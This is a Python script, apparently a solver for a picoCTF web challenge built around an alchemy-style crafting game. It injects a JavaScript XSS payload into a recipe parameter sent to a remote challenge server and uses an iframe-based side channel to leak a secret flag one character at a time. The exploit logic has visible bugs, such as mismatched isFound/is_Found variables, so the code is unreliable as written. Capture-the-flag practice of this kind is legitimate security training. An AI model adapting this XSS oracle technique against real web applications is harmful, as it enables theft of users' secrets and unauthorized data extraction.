import requests
import json
from time import sleep
import string

def doxss(xss):
    return json.dumps({
    "recipe": [['Water', 'Earth'], ['Water', 'Air'], ['Mist', 'Fire'], ['Mud', 'Fog'], ['Fire', 'Earth'], ['Magma', 'Mud'], ['Obsidian', 'Water'], ['Sludge', 'Hot Spring'], ['Steam Engine', 'Fire'], ['Earth', 'Air'], ['Heat Engine', 'Dust'], ['Sand', 'Fire'], ['Obsidian', 'Earth'], ['Hot Spring', 'Steam Engine'], ['Computer Chip', 'Electricity'], ['Glass', 'Software'], ['Computer Chip', 'Steam Engine'], ['Computer Chip', 'Fire'], ['Artificial Intelligence', 'Data'], ['Software', 'Encryption'], ['Vulnerability', 'Cybersecurity'], ['Electricity', 'Software'], ['Magma', 'Mist'], ['Rock', 'Air'], ['Program', 'Internet'], ['Exploit', 'Web Design']],
    "xss": xss})

flag = "picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}"
idx = 69
# url = 'http://localhost:8080/remoteCraft'
url = 'http://rhea.picoctf.net:50835/remoteCraft'

# charset = string.digits + string.ascii_lowercase + '}'
charset = string.printable

while True:
    print(f"Flag: {flag}")
    for string in charset:
        print(f"Trying: {flag + string}")

        isFound = False
        chr = string
        xss = "if (JSON.parse(atob(window.location.hash.slice(1))).flag[" + str(idx) + "] == " + "'" + string + "'" +"){document.body.innerHTML+=`<iframe srcdoc=\"<script src='${location.origin}//'>\"></iframe>`;};"
        print(xss)
        cnt = 0

        while cnt <= 15:
            try:
                full = f"{url}?recipe={requests.utils.quote(doxss(xss))}"
                requests.get(full)    
            except ConnectionRefusedError:
                flag += charset[charset.index(string)-1]
                idx += 1
                cnt = 15
                is_Found = True
                continue

            if isFound:
                break

            cnt += 1
            
        # print(f"[Counter: {cnt}, isFound: {isFound}]")

    if len(flag) != 0 and flag[-1] != '}':
        break
